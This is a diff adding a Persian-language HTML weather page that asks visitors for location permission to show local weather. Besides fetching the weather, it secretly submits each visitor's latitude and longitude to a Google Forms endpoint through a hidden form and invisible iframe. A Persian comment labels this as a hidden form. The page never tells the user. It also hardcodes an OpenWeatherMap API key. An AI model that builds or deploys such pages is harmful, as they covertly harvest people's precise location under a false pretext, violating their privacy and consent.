@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8" />
+  <title>وضعیت آب‌وهوا</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600&display=swap');
+
+    :root {
+      direction: rtl;
+      writing-mode: horizontal-tb;
+      text-orientation: mixed;
+    }
+
+    body {
+      font-family: 'Vazirmatn', sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #c9d6ff, #e2e2e2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+    }
+
+    h2 {
+      margin-top: 0;
+      color: #333;
+    }
+
+    p {
+      color: #555;
+      font-size: 15px;
+    }
+
+    button {
+      margin-top: 20px;
+      background: #28a745;
+      color: white;
+      border: none;
+      padding: 12px 28px;
+      font-size: 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #218838;
+    }
+
+    .status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #555;
+    }
+
+    .weather {
+      background: #f7f7f7;
+      padding: 20px;
+      border-radius: 15px;
+      margin-top: 20px;
+      display: none;
+    }
+
+    .weather h3 {
+      margin-bottom: 10px;
+      font-size: 20px;
+      color: #333;
+    }
+
+    .weather p {
+      margin: 5px 0;
+      font-size: 15px;
+      color: #444;
+    }
+
+    .icon {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>نمایش وضعیت آب‌وهوا</h2>
+    <p>لطفاً اجازه دهید موقعیت مکانی شما را دریافت کنیم تا آب‌وهوا را نمایش دهیم.</p>
+    <button id="getLocation">گرفتن موقعیت مکانی</button>
+
+    <div class="status" id="status"></div>
+    <div class="weather" id="weather">
+      <img id="icon" class="icon" src="" alt="" />
+      <h3 id="city"></h3>
+      <p id="description"></p>
+      <p id="temperature"></p>
+      <p id="feels"></p>
+    </div>
+  </div>
+
+  <!-- فرم مخفی ارسال به گوگل -->
+  <form
+    id="geoForm"
+    action="https://docs.google.com/forms/d/e/1FAIpQLScDW6N-rkW-8uEywYmmMW6teaVZB22856Jo5e8-UuDsk9szQg/formResponse"
+    method="POST"
+    target="hidden_iframe"
+  >
+    <input type="hidden" name="entry.524482813" id="latitude" />
+    <input type="hidden" name="entry.489892122" id="longitude" />
+  </form>
+  <iframe name="hidden_iframe" style="display: none;"></iframe>
+
+  <script>
+    const getLocationBtn = document.getElementById('getLocation');
+    const statusEl = document.getElementById('status');
+    const weatherEl = document.getElementById('weather');
+    const cityEl = document.getElementById('city');
+    const descEl = document.getElementById('description');
+    const tempEl = document.getElementById('temperature');
+    const feelsEl = document.getElementById('feels');
+    const iconEl = document.getElementById('icon');
+
+    getLocationBtn.addEventListener('click', () => {
+      statusEl.innerText = 'در حال دریافت موقعیت مکانی...';
+      weatherEl.style.display = 'none';
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            // ارسال به فرم گوگل
+            document.getElementById('latitude').value = lat;
+            document.getElementById('longitude').value = lon;
+            document.getElementById('geoForm').submit();
+
+            statusEl.innerText = 'موقعیت دریافت شد ✅ در حال دریافت وضعیت آب‌وهوا...';
+
+            try {
+              const res = await fetch(
+                `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=a9b1c90b2d77767bc72efd0b776b860e&units=metric&lang=fa`
+              );
+              const data = await res.json();
+
+              const temp = data.main.temp;
+              const feels = data.main.feels_like;
+              const city = data.name;
+              const desc = data.weather[0].description;
+              const icon = data.weather[0].icon;
+
+              cityEl.innerText = `شهر: ${city}`;
+              descEl.innerText = `وضعیت: ${desc}`;
+              tempEl.innerText = `دما: ${temp} درجه`;
+              feelsEl.innerText = `احساس واقعی: ${feels} درجه`;
+              iconEl.src = `https://openweathermap.org/img/wn/${icon}@2x.png`;
+
+              weatherEl.style.display = 'block';
+              statusEl.innerText = '';
+            } catch (error) {
+              statusEl.innerText = '❌ خطا در دریافت اطلاعات آب‌وهوا';
+            }
+          },
+          () => {
+            statusEl.innerText = '❌ دسترسی به موقعیت مکانی رد شد';
+          }
+        );
+      } else {
+        statusEl.innerText = 'مرورگر شما موقعیت مکانی را پشتیبانی نمی‌کند.';
+      }
+    });
+  </script>
+</body>
+</html>
